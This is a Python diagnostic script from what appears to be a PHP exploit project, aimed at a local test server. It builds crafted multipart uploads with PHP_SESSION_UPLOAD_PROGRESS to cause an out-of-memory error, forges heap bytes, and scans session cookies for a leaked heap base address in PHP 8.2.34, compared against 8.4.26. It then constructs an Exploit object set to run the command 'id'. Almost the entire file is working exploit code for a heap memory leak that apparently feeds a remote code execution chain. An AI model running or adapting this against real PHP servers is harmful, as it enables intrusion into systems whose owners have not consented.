#!/usr/bin/env python3
"""8.2.34: does the OOM+heap-leak trigger fire at all? (compare to 8.4.26 where it works)"""
import os
import sys, time, struct, re, urllib.parse
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from exploit import Target, Exploit, build_multipart

t = Target("http://127.0.0.1:18111/index.php", timeout=90.0, verbose=False)

def cookie_of(resp):
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1")) if m else b""

def heap_base(cookie):
    if len(cookie) < 1000:
        return 0
    from collections import Counter
    c = Counter()
    for i in range(0, len(cookie)-8, 8):
        v = int.from_bytes(cookie[i:i+8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, cnt = c.most_common(1)[0]
    return base if cnt >= 8 else 0

ex = Exploit(t, "id", htdata_offset=0x690d8, profile="bookworm")

def reqA(nsmall=1001):
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(nsmall)]
    parts += [{"name":"PHPSESSID","data":b"0123456789abcdef0123456789ab"},
              {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
              ex._file_part(), ex._big_field()]
    return t.post(build_multipart(parts, b"S"*17), b"S"*17, read_cap=9<<20)

def reqB(n, flen=79, q_val=0x1000, L_off=0x18):
    parts = [{"name":"PHPSESSID","data":b"0123456789abcdef0123456789ab"},
             {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
    for i in range(n):
        parts.append({"name": str(1000+i), "data": (f"v{i:04d}"+"x"*44)[:48].encode()})
    forge = bytearray(b"A"*flen)
    struct.pack_into("<Q", forge, 0x10, q_val)
    forge[L_off] = ord("L")
    parts.append({"name":"1999","data":bytes(forge)})
    return t.post(build_multipart(parts, b"B"*10), b"B"*10, read_cap=9<<20)

# First: is the OOM even happening? Check the body for the fatal error.
print("=== 8.2.34: OOM + heap-leak diagnostic ===")
rA = reqA(); time.sleep(0.3)
head, sep, body = rA.partition(b"\r\n\r\n")
oom = b"memory size" in body or b"Fatal" in body
print(f"  reqA: oom_error={oom}  body={body[:90]!r}")

# Now scan N for the leak
for n in (800, 841, 860, 900, 950, 1000):
    reqA(); time.sleep(0.2)
    ck = cookie_of(reqB(n)); base = heap_base(ck)
    mark = f"LEAK 0x{base:x}" if base else f"c={len(ck)}"
    print(f"  n={n}: {mark}", flush=True)
    if base:
        print(f"  >>> 8.2.34 LEAK at n={n} base=0x{base:x}"); sys.exit(0)
print("  NO leak in this parameter space (8.2.34)")
sys.exit(1)
